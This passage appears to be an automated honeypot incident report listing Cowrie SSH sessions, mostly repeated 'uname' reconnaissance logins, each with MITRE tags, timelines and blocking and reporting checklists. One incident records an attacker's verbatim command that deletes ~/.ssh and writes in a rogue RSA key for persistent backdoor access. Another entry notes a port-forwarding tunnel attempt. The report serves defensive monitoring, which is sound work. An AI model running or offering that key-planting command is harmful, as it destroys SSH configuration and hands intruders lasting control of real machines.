| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:37` | `cowrie.session.connect` |
| `2026-07-24 15:10:37` | `cowrie.client.version` |
| `2026-07-24 15:10:37` | `cowrie.client.kex` |
| `2026-07-24 15:10:37` | `cowrie.login.success` |
| `2026-07-24 15:10:38` | `cowrie.session.params` |
| `2026-07-24 15:10:38` | `cowrie.command.input` |
| `2026-07-24 15:10:38` | `cowrie.log.closed` |
| `2026-07-24 15:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e319897396c8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:43` | `cowrie.session.connect` |
| `2026-07-24 15:10:43` | `cowrie.client.version` |
| `2026-07-24 15:10:43` | `cowrie.client.kex` |
| `2026-07-24 15:10:43` | `cowrie.login.success` |
| `2026-07-24 15:10:44` | `cowrie.session.params` |
| `2026-07-24 15:10:44` | `cowrie.command.input` |
| `2026-07-24 15:10:44` | `cowrie.log.closed` |
| `2026-07-24 15:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f5c0cde972

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:48` | `cowrie.session.connect` |
| `2026-07-24 15:10:48` | `cowrie.client.version` |
| `2026-07-24 15:10:48` | `cowrie.client.kex` |
| `2026-07-24 15:10:49` | `cowrie.login.success` |
| `2026-07-24 15:10:49` | `cowrie.session.params` |
| `2026-07-24 15:10:49` | `cowrie.command.input` |
| `2026-07-24 15:10:49` | `cowrie.command.failed` |
| `2026-07-24 15:10:50` | `cowrie.log.closed` |
| `2026-07-24 15:10:50` | `cowrie.session.params` |
| `2026-07-24 15:10:50` | `cowrie.command.input` |
| `2026-07-24 15:10:50` | `cowrie.session.file_download` |
| `2026-07-24 15:10:50` | `cowrie.log.closed` |
| `2026-07-24 15:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663cd24bf95f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:49` | `cowrie.session.connect` |
| `2026-07-24 15:10:49` | `cowrie.client.version` |
| `2026-07-24 15:10:50` | `cowrie.client.kex` |
| `2026-07-24 15:10:50` | `cowrie.login.success` |
| `2026-07-24 15:10:51` | `cowrie.session.params` |
| `2026-07-24 15:10:51` | `cowrie.command.input` |
| `2026-07-24 15:10:51` | `cowrie.log.closed` |
| `2026-07-24 15:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8a3168b2a37

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:50` | `cowrie.session.connect` |
| `2026-07-24 15:10:50` | `cowrie.client.version` |
| `2026-07-24 15:10:51` | `cowrie.client.kex` |
| `2026-07-24 15:10:51` | `cowrie.login.success` |
| `2026-07-24 15:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119e11d003e0

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:52` | `cowrie.session.connect` |
| `2026-07-24 15:10:52` | `cowrie.client.version` |
| `2026-07-24 15:10:52` | `cowrie.client.kex` |
| `2026-07-24 15:10:52` | `cowrie.login.success` |
| `2026-07-24 15:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa68c1bff599

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:56` | `cowrie.session.connect` |
| `2026-07-24 15:10:56` | `cowrie.client.version` |
| `2026-07-24 15:10:56` | `cowrie.client.kex` |
| `2026-07-24 15:10:57` | `cowrie.login.success` |
| `2026-07-24 15:10:58` | `cowrie.session.params` |
| `2026-07-24 15:10:58` | `cowrie.command.input` |
| `2026-07-24 15:10:58` | `cowrie.log.closed` |
| `2026-07-24 15:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3b90d34b3f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:04` | `cowrie.session.connect` |
| `2026-07-24 15:11:04` | `cowrie.client.version` |
| `2026-07-24 15:11:04` | `cowrie.client.kex` |
| `2026-07-24 15:11:04` | `cowrie.login.success` |
| `2026-07-24 15:11:05` | `cowrie.session.params` |
| `2026-07-24 15:11:05` | `cowrie.command.input` |
| `2026-07-24 15:11:05` | `cowrie.log.closed` |
| `2026-07-24 15:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc17eb7b1fc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:10` | `cowrie.session.connect` |
| `2026-07-24 15:11:10` | `cowrie.client.version` |
| `2026-07-24 15:11:10` | `cowrie.client.kex` |
| `2026-07-24 15:11:11` | `cowrie.login.success` |
| `2026-07-24 15:11:12` | `cowrie.session.params` |
| `2026-07-24 15:11:12` | `cowrie.command.input` |
| `2026-07-24 15:11:12` | `cowrie.log.closed` |
| `2026-07-24 15:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-883af952b4d9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:17` | `cowrie.session.connect` |
| `2026-07-24 15:11:17` | `cowrie.client.version` |
| `2026-07-24 15:11:17` | `cowrie.client.kex` |
| `2026-07-24 15:11:17` | `cowrie.login.success` |
| `2026-07-24 15:11:18` | `cowrie.session.params` |
| `2026-07-24 15:11:18` | `cowrie.command.input` |
| `2026-07-24 15:11:18` | `cowrie.log.closed` |
| `2026-07-24 15:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eff3ee02aeb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:24` | `cowrie.session.connect` |
| `2026-07-24 15:11:24` | `cowrie.client.version` |
| `2026-07-24 15:11:24` | `cowrie.client.kex` |
| `2026-07-24 15:11:24` | `cowrie.login.success` |
| `2026-07-24 15:11:25` | `cowrie.session.params` |
| `2026-07-24 15:11:25` | `cowrie.command.input` |
| `2026-07-24 15:11:25` | `cowrie.log.closed` |
| `2026-07-24 15:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ac9ed4ae35

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:30` | `cowrie.session.connect` |
| `2026-07-24 15:11:30` | `cowrie.client.version` |
| `2026-07-24 15:11:31` | `cowrie.client.kex` |
| `2026-07-24 15:11:31` | `cowrie.login.success` |
| `2026-07-24 15:11:32` | `cowrie.session.params` |
| `2026-07-24 15:11:32` | `cowrie.command.input` |
| `2026-07-24 15:11:32` | `cowrie.log.closed` |
| `2026-07-24 15:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d917d886ab2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:37` | `cowrie.session.connect` |
| `2026-07-24 15:11:37` | `cowrie.client.version` |
| `2026-07-24 15:11:37` | `cowrie.client.kex` |
| `2026-07-24 15:11:37` | `cowrie.login.success` |
| `2026-07-24 15:11:38` | `cowrie.session.params` |
| `2026-07-24 15:11:38` | `cowrie.command.input` |
| `2026-07-24 15:11:38` | `cowrie.log.closed` |
| `2026-07-24 15:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9378cc9fb854

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:43` | `cowrie.session.connect` |
| `2026-07-24 15:11:43` | `cowrie.client.version` |
| `2026-07-24 15:11:43` | `cowrie.client.kex` |
| `2026-07-24 15:11:44` | `cowrie.login.success` |
| `2026-07-24 15:11:45` | `cowrie.session.params` |
| `2026-07-24 15:11:45` | `cowrie.command.input` |
| `2026-07-24 15:11:45` | `cowrie.log.closed` |
| `2026-07-24 15:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c5c82b3382

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:50` | `cowrie.session.connect` |
| `2026-07-24 15:11:50` | `cowrie.client.version` |
| `2026-07-24 15:11:50` | `cowrie.client.kex` |
| `2026-07-24 15:11:50` | `cowrie.login.success` |
| `2026-07-24 15:11:51` | `cowrie.session.params` |
| `2026-07-24 15:11:51` | `cowrie.command.input` |
| `2026-07-24 15:11:51` | `cowrie.log.closed` |
| `2026-07-24 15:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54e736f0277

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:11 |
| **Last Seen** | 2026-07-24 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:11:56` | `cowrie.session.connect` |
| `2026-07-24 15:11:56` | `cowrie.client.version` |
| `2026-07-24 15:11:56` | `cowrie.client.kex` |
| `2026-07-24 15:11:56` | `cowrie.login.success` |
| `2026-07-24 15:11:57` | `cowrie.session.params` |
| `2026-07-24 15:11:57` | `cowrie.command.input` |
| `2026-07-24 15:11:57` | `cowrie.log.closed` |
| `2026-07-24 15:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3c003161bf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:03` | `cowrie.session.connect` |
| `2026-07-24 15:12:03` | `cowrie.client.version` |
| `2026-07-24 15:12:03` | `cowrie.client.kex` |
| `2026-07-24 15:12:03` | `cowrie.login.success` |
| `2026-07-24 15:12:04` | `cowrie.session.params` |
| `2026-07-24 15:12:04` | `cowrie.command.input` |
| `2026-07-24 15:12:04` | `cowrie.log.closed` |
| `2026-07-24 15:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6098cbac20

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:09` | `cowrie.session.connect` |
| `2026-07-24 15:12:09` | `cowrie.client.version` |
| `2026-07-24 15:12:09` | `cowrie.client.kex` |
| `2026-07-24 15:12:10` | `cowrie.login.success` |
| `2026-07-24 15:12:10` | `cowrie.session.params` |
| `2026-07-24 15:12:10` | `cowrie.command.input` |
| `2026-07-24 15:12:10` | `cowrie.log.closed` |
| `2026-07-24 15:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760e15d55361

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:16` | `cowrie.session.connect` |
| `2026-07-24 15:12:16` | `cowrie.client.version` |
| `2026-07-24 15:12:16` | `cowrie.client.kex` |
| `2026-07-24 15:12:16` | `cowrie.login.success` |
| `2026-07-24 15:12:17` | `cowrie.session.params` |
| `2026-07-24 15:12:17` | `cowrie.command.input` |
| `2026-07-24 15:12:17` | `cowrie.log.closed` |
| `2026-07-24 15:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443888bbfeb4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:22` | `cowrie.session.connect` |
| `2026-07-24 15:12:22` | `cowrie.client.version` |
| `2026-07-24 15:12:22` | `cowrie.client.kex` |
| `2026-07-24 15:12:22` | `cowrie.login.success` |
| `2026-07-24 15:12:23` | `cowrie.session.params` |
| `2026-07-24 15:12:23` | `cowrie.command.input` |
| `2026-07-24 15:12:23` | `cowrie.log.closed` |
| `2026-07-24 15:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e40eb7e9647

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:28` | `cowrie.session.connect` |
| `2026-07-24 15:12:28` | `cowrie.client.version` |
| `2026-07-24 15:12:28` | `cowrie.client.kex` |
| `2026-07-24 15:12:29` | `cowrie.login.success` |
| `2026-07-24 15:12:29` | `cowrie.session.params` |
| `2026-07-24 15:12:29` | `cowrie.command.input` |
| `2026-07-24 15:12:29` | `cowrie.log.closed` |
| `2026-07-24 15:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c8687842ee

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:35` | `cowrie.session.connect` |
| `2026-07-24 15:12:35` | `cowrie.client.version` |
| `2026-07-24 15:12:35` | `cowrie.client.kex` |
| `2026-07-24 15:12:35` | `cowrie.login.success` |
| `2026-07-24 15:12:36` | `cowrie.session.params` |
| `2026-07-24 15:12:36` | `cowrie.command.input` |
| `2026-07-24 15:12:36` | `cowrie.log.closed` |
| `2026-07-24 15:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11c53ffc4145

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:41` | `cowrie.session.connect` |
| `2026-07-24 15:12:41` | `cowrie.client.version` |
| `2026-07-24 15:12:41` | `cowrie.client.kex` |
| `2026-07-24 15:12:42` | `cowrie.login.success` |
| `2026-07-24 15:12:42` | `cowrie.session.params` |
| `2026-07-24 15:12:42` | `cowrie.command.input` |
| `2026-07-24 15:12:42` | `cowrie.log.closed` |
| `2026-07-24 15:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbd9f89051be

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:47` | `cowrie.session.connect` |
| `2026-07-24 15:12:47` | `cowrie.client.version` |
| `2026-07-24 15:12:47` | `cowrie.client.kex` |
| `2026-07-24 15:12:48` | `cowrie.login.success` |
| `2026-07-24 15:12:49` | `cowrie.session.params` |
| `2026-07-24 15:12:49` | `cowrie.command.input` |
| `2026-07-24 15:12:49` | `cowrie.log.closed` |
| `2026-07-24 15:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0767e0b089

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:52` | `cowrie.session.connect` |
| `2026-07-24 15:12:52` | `cowrie.client.version` |
| `2026-07-24 15:12:52` | `cowrie.client.kex` |
| `2026-07-24 15:12:52` | `cowrie.login.success` |
| `2026-07-24 15:12:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:12:52` | `cowrie.direct-tcpip.ja4` |
| `2026-07-24 15:12:52` | `cowrie.direct-tcpip.data` |
| `2026-07-24 15:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
